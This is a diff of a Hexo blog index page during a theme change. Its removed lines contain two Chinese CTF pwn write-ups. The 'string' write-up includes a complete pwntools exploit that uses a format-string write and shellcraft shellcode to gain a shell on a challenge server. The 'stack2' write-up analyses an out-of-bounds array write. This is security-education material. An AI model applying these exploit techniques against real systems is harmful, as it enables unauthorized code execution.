-<p><img src="https://i.loli.net/2020/05/08/lbkP9F8xrwtuTWC.png" alt="捕获.PNG"></p>
-<p>注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000.</p>
-<h3 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h3><p>IDA64查看，在sub_400CA6()中发现：v1被强制转换成函数指针类型。</p>
-<p><img src="https://i.loli.net/2020/05/08/4sSQG3NBDWnR7Jw.png" alt="17627983-1901e053361f6609.png"></p>
-<blockquote>
-<p>注：<code> ((void (__fastcall *)(_QWORD, void *))v1)(0LL, v1);</code> 就是将v1强制转换为一个函数指针</p>
-</blockquote>
-<p>其满足条件为 a1==a1[1]，回溯发现，a1为函数sub_400D72()函数的参数，即，a1为v5.</p>
-<p><img src="https://i.loli.net/2020/05/08/zpABrQvk81ThUoe.png" alt="17627983-161d0aad17e6e884.png"></p>
-<p>可看出，v4=v5,且*v4=68;v4[1]=85;也就是说，a1=68,a1[1]=85.所以我们要修改a1值令a1=85</p>
-<p>按流程分析：<br>在sub_400A7D()中，满足s1==“east”，则跳出函数。</p>
-<p>在sub_400BB9()中发现格式化字符串漏洞（可以进行任意地址改写）</p>
-<p><img src="https://i.loli.net/2020/05/08/DzEihSeIblU8uFA.png" alt="17627983-6cdde7e8a076f299.png"></p>
-<p><code>printf(&amp;format, &amp;format);</code></p>
-<p>通过此处可修改v4[0]值，现在需要确定v4[0]地址。在main()函数中，打印的secret[0]正是v5,即v4[0]地址。</p>
-<h3 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>通过格式化字符串漏洞赋值a1为85，使if条件成真，执行我们传入的shellcode拿到shell。</p>
-<blockquote>
-<p>函数调用约定：linux_x64下，参数从左到右放入寄存器：RDI,RSI,RDX,ECX,R8,R9,当参数为7个以上时，前面6个与前面一样，但后面的以此从“右向左”放入栈中。</p>
-</blockquote>
-<blockquote>
-<p>利用pwntools自带的shellcodecraft工具，生成amd64架构下的shellcode，拿到shell.</p>
-</blockquote>
-<blockquote>
-<p>Pwntools  shellcraft模块：是shellcode的模块，包含一些生成shellcode的函数，子模块声明架构（如：shellcode.arm是ARm架构；shellcraft.amd64是AMD64架构；shellcraft.common是所有架构通用）</p>
-</blockquote>
-<p><code>printf(shellcraft.sh())  #打印出shellcode</code><br><code>printf(asm(shellcraft.sh()))  #打印出汇编后的shellcode</code></p>
-<p>用gdb调试程序，在printf下断点，输入%x测试，发现输出如图：</p>
-<p><img src="https://i.loli.net/2020/05/08/pYcXRjQuOKesnf6.png" alt="17627983-fe71239050c56166.png"></p>
-<p>填写address时我输入的是56（0x38），也就是[rsp+16]的位置，即格式化字符串的第7个参数（printf的第8个参数）</p>
-<blockquote>
-<p>conext.log_level=”debug”  脚本在执行时输出debug的信息，可以通过观察这些信息查找哪步出错</p>
-</blockquote>
-<p>补：<br>之前不知道sh.recv(7),16是什么意思，现在补充，就是sendline自带换行符，所以要把\n过滤掉，7是因为v3就是打印的6个书，换行符是第7位，16代表十六进制。</p>
-<p><img src="https://i.loli.net/2020/05/08/b82ZR5pS9hPd4FK.png" alt="17627983-56395b2513720994.png"></p>
-<p>exp：</p>
-<pre><code>from pwn import*
- #sh=process('./string')
-sh=remote('111.198.29.45',36129)
-context.log_level='debug'
-sh.recvuntil('secret[0] is')
-v3_addr=int(sh.recv(7),16)
-sh.recvuntil('name be:')
-sh.sendline('zzz')
-sh.recvuntil('east or up?:')
-sh.sendline('east')
-sh.recvuntil('leave(0)?:')
-sh.sendline('1')
-sh.recvuntil('\'Give me an address\'')
-sh.sendline(str(v3_addr))
-sh.recvuntil('you wish is:')
-payload='%085c'+'%7$n'
-sh.sendline(payload)
-sh.recvuntil('I will help you! USE YOU SPELL')
-sh.sendline(asm(shellcraft.amd64.linux.sh(),arch="amd64"))
-sh.interactive()
-</code></pre>
-<p>cyberpeace{962a040a22938025e2ad4bbe3e5b56d3}</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:08" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
-  
-</article>
 
-
-
-
-
-
-
-  
-    <article id="post-攻防世界-pwn-stack2" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" class="article-date">
-  	<time datetime="2022-08-09T04:04:51.567Z" itemprop="datePublished">2022-08-09</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
+  <div class="row mx-auto index-card">
     
     
-      <header class="article-header">
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
         
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/">
-        攻防世界-pwn-stack2
-        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" target="_self">
+          攻防世界 string
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn-string/" target="_self">
+        <div>
+          checksec 查看保护机制  注：开启Full RELRO，无法修改got表；开启Canary found，不能直接用溢出方法覆盖栈中返回地址，要通过改写指针与局部变量、leak canary、overwrite canary的方法来绕过；开启NX,意味着栈中数据没有执行权限；PIE未开启，基地址不会变化，为0x400000. 思路分析IDA64查看，在sub_400CA6()中发现：v1被强
+        </div>
       </a>
-    </h1>
-  
 
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="0x01-分析"><a href="#0x01-分析" class="headerlink" title="0x01 分析"></a>0x01 分析</h2><p>checksec检查：</p>
-<p><img src="https://i.loli.net/2020/07/27/seUw8f5zIvPk9W7.png" alt="捕获.PNG"></p>
-<p>32位，无PIE，开了NX和canary.<br>运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。</p>
-<p>IDA中查看main函数：</p>
-<pre><code>int __cdecl main(int argc, const char **argv, const char **envp)
-{
-  int v3; // eax
-  unsigned int v5; // [esp+18h] [ebp-90h]
-  unsigned int v6; // [esp+1Ch] [ebp-8Ch]
-  int v7; // [esp+20h] [ebp-88h]
-  unsigned int j; // [esp+24h] [ebp-84h]
-  int v9; // [esp+28h] [ebp-80h]
-  unsigned int i; // [esp+2Ch] [ebp-7Ch]
-  unsigned int k; // [esp+30h] [ebp-78h]
-  unsigned int l; // [esp+34h] [ebp-74h]
-  char v13[100]; // [esp+38h] [ebp-70h]
-  unsigned int v14; // [esp+9Ch] [ebp-Ch]
-  v14 = __readgsdword(0x14u);
-  setvbuf(stdin, 0, 2, 0);
-  setvbuf(stdout, 0, 2, 0);
-  v9 = 0;
-  puts("***********************************************************");
-  puts("*                      An easy calc                       *");
-  puts("*Give me your numbers and I will return to you an average *");
-  puts("*(0 &lt;= x &lt; 256)                                           *");
-  puts("***********************************************************");
-  puts("How many numbers you have:");
-  __isoc99_scanf("%d", &amp;v5);
-  puts("Give me your numbers");
-  for ( i = 0; i &lt; v5 &amp;&amp; (signed int)i &lt;= 0x63; ++i )
-  {
-    __isoc99_scanf("%d", &amp;v7);
-    v13[i] = v7;
-  }
-  for ( j = v5; ; printf("average is %.2lf\n", (double)((long double)v9 / (double)j)) )
-  {
-    while ( 1 )
-    {
-      while ( 1 )
-      {
-        while ( 1 )
-        {
-          puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit");
-          __isoc99_scanf("%d", &amp;v6);
-          if ( v6 != 2 )
-            break;
-          puts("Give me your number");
-          __isoc99_scanf("%d", &amp;v7);
-          if ( j &lt;= 0x63 )
-          {
-            v3 = j++;
-            v13[v3] = v7;
-          }
-        }
-        if ( v6 &gt; 2 )
-          break;
-        if ( v6 != 1 )
-          return 0;
-        puts("id\t\tnumber");
-        for ( k = 0; k &lt; j; ++k )
-          printf("%d\t\t%d\n", k, v13[k]);
-      }
-      if ( v6 != 3 )
-        break;
-      puts("which number to change:");
-      __isoc99_scanf("%d", &amp;v5);
-      puts("new number:");
-      __isoc99_scanf("%d", &amp;v7);
-      v13[v5] = v7;
-    }
-    if ( v6 != 4 )
-      break;
-    v9 = 0;
-    for ( l = 0; l &lt; j; ++l )
-      v9 += v13[l];
-  }
-  return 0;
-}
-</code></pre>
-<p>发现没有检查v13数组边界，当选择3.change number时程序没有对v5进行检测，存在数组越界，产生溢出：</p>
-<pre><code> puts("which number to change:");
-      __isoc99_scanf("%d", &amp;v5);
-      puts("new number:");
-      __isoc99_scanf("%d", &amp;v7);
-      v13[v5] = v7;
-</code></pre>
-<p>发现给了/bin/bash:</p>
-<pre><code>:0804859B ; __unwind {
-.text:0804859B                 push    ebp
-.text:0804859C                 mov     ebp, esp
-.text:0804859E                 sub     esp, 18h
-.text:080485A1                 mov     eax, large gs:14h
-.text:080485A7                 mov     [ebp+var_C], eax
-.text:080485AA                 xor     eax, eax
-.text:080485AC                 sub     esp, 0Ch
-.text:080485AF                 push    offset command  ; "/bin/bash"
-.text:080485B4                 call    _system ;system
-.text:080485B9                 add     esp, 10h
-.text:080485BC                 nop
-.text:080485BD                 mov     edx, [ebp+var_C]
-.text:080485C0                 xor     edx, large gs:14h
-.text:080485C7                 jz      short locret_80485CE
-.text:080485C9                 call    ___stack_chk_fail
-</code></pre>
-<p>开启动态调试，在v13[v5]=v7处下断点，</p>
-<p><img src="https://i.loli.net/2020/07/31/ClcWPX8p29JHxQk.png" alt="linux输入.PNG"></p>
-<p>转到IDA界面，查看此地址，此时edx存入的即为输入的数字9，在栈中的位置是：</p>
-<p><img src="https://i.loli.net/2020/07/31/j24baYfNMdlRrGD.png" alt="捕获.PNG"></p>
-<p>得到了输入在栈中的位置，找到返回地址的位置覆盖掉就可以了。</p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/" rel="tag">pwn</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:06" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
+            
+          </div>
+        
+      </div>
+    </article>
   </div>
+
+  <div class="row mx-auto index-card">
+    
+    
+    <article class="col-12 col-md-12 mx-auto index-info">
+      <h1 class="index-header">
+        
+        <a href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" target="_self">
+          攻防世界-pwn-stack2
+        </a>
+      </h1>
+
+      
+      <a class="index-excerpt index-excerpt__noimg" href="/SinkyQ/SinkyQ.github.io.git/2022/08/09/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-pwn-stack2/" target="_self">
+        <div>
+          0x01 分析checksec检查：  32位，无PIE，开了NX和canary.运行一下是只有五个模块，展示数字，添加，更改，求平均数，退出。 IDA中查看main函数： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061
+        </div>
+      </a>
+
+      <div class="index-btm post-metas">
+        
+          <div class="post-meta mr-3">
+            <i class="iconfont icon-date"></i>
+            <time datetime="2022-08-09 12:04" pubdate>
+              2022-08-09
+            </time>
+          </div>
+        
+        
+        
+          <div class="post-meta">
+            <i class="iconfont icon-tags"></i>
+            
+              <a href="/SinkyQ/SinkyQ.github.io.git/tags/pwn/">#pwn</a>
+            
+          </div>
+        
+      </div>
+    </article>
+  </div>
+
+
+
+  <nav aria-label="navigation">
+    <span class="pagination" id="pagination">
+      <span class="page-number current">1</span><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/#board">2</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/3/#board">3</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/4/#board">4</a><a class="extend next" rel="next" href="/SinkyQ/SinkyQ.github.io.git/page/2/#board"><i class="iconfont icon-arrowright"></i></a>
+    </span>
+  </nav>
+
+
+
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
   
-</article>
-
-
-
-
-
-
-
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
   
   
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/2/">2</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/3/">3</a><a class="page-number" href="/SinkyQ/SinkyQ.github.io.git/page/4/">4</a><a class="extend next" rel="next" href="/SinkyQ/SinkyQ.github.io.git/page/2/">Next &amp;raquo;</a>
-    </nav>
+  
   
 </div>
-      <footer id="footer">
-  <div class="outer">
-    <div id="footer-info">
-      <div class="footer-left">
-        &copy; 2022 Sinky
-      </div>
-        <div class="footer-right">
-          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
-        </div>
-    </div>
-  </div>
-</footer>
-    </div>
-    
+
+  </footer>
+
+  <!-- Scripts -->
   
-<link rel="stylesheet" href="/SinkyQ/SinkyQ.github.io.git/fancybox/jquery.fancybox.css">
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/events.js" ></script>
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
 
 
 
-<script>
-	var yiliaConfig = {
-		fancybox: true,
-		mathjax: false,
-		animate: true,
-		isHome: true,
-		isPost: false,
-		isArchive: false,
-		isTag: false,
-		isCategory: false,
-		open_in_new: false
-	}
-</script>
 
-<script src="/SinkyQ/SinkyQ.github.io.git/js/main.js"></script>
+  
+    <script  src="/SinkyQ/SinkyQ.github.io.git/js/img-lazyload.js" ></script>
+  
 
 
 
 
-  </div>
+  <script  src="/SinkyQ/SinkyQ.github.io.git/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/SinkyQ/SinkyQ.github.io.git/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
+  </noscript>
 </body>
 </html>
